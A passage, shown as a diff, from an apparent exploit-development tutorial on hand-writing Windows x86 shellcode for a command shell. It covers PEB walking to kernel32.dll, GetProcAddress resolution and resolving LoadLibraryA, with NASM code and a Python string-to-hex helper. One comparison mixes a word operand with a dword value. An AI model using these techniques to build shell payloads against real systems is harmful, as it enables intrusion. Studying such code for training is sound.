@@ -127,3 +127,84 @@ So we're poised to push our command shell and redirect standard i/o to it as lon
 As you can see, we have a `BOOL` value in our arguments that's set to `TRUE`. This is the aforementioned `bInheritHandles` parameter and we've set it appropriately to complete our prototype. Everything else in `CreateProcessA` is similar to what we've already done. 
 
 ## Assembly Time
+Now the fun part. I'll skip all of the pieces we've already completed over and over. 
+```nasm
+global_start
+
+
+section .text
+_start: 
+
+xor ecx, ecx
+mul ecx
+mov eax, [fs:ecx + 0x30] 
+mov eax, [eax + 0xc]     
+mov esi, [eax + 0x14]    
+lodsd                    
+xchg eax, esi            
+lodsd                    
+mov ebx, [eax + 0x10]    
+mov edi, [ebx + 0x3c]    
+add edi, ebx             
+mov edi, [edi + 0x78]    
+add edi, ebx             
+mov esi, [edi + 0x20]    
+add esi, ebx             
+xor ecx, ecx 
+```
+
+We now have the base address of `kernel32.dll` in ESI as per usual. 
+```nasm
+Get_Function:
+ 
+inc ecx                              
+lodsd                               
+add eax, ebx                         
+cmp dword [eax], 0x50746547        ; GetP
+jnz Get_Function
+cmp word [eax + 0xa], 0x73736572   ; ress
+jnz Get_Function
+mov esi, [edi + 0x24]                
+add esi, ebx                         
+mov cx, [esi + ecx * 2]              
+dec ecx
+mov esi, [edi + 0x1c]                
+add esi, ebx                         
+mov edi, [esi + ecx * 4]             
+add edi, ebx                         
+```
+
+We now have the address of `GetProcAddress` stored in EDI. One thing to note here is that `GetProcAddress` stores the address of the retrieved function/library inside of EAX. 
+
+```nasm
+; use GetProcAddress to find LoadLibraryA
+xor ecx, ecx
+push ecx
+push 0x41797261   
+push 0x7262694c
+push 0x64616f4c
+push esp
+push ebx
+call edi
+```
+
+We have to push the string `LoadLibraryA` onto the stack first. I used my [ascii to hex converter python script](https://github.com/h0mbre/AWE-OSEE/tree/master/Ascii_to_Hex), which I got from @NinjaParanoid. The script is this:
+```python
+C:\Users\IEUser\Documents>type a2h.py
+import textwrap
+import binascii
+import sys
+
+function_name = sys.argv[1]
+
+print textwrap.wrap((binascii.hexlify(function_name[::-1]).decode()), 8)
+```
+This outputs the exact `DWORD` values to push onto the stack. 
+
+```terminal_session
+C:\Users\IEUser\Documents>a2h.py LoadLibraryA
+[u'41797261', u'7262694c', u'64616f4c']
+```
+
+
+
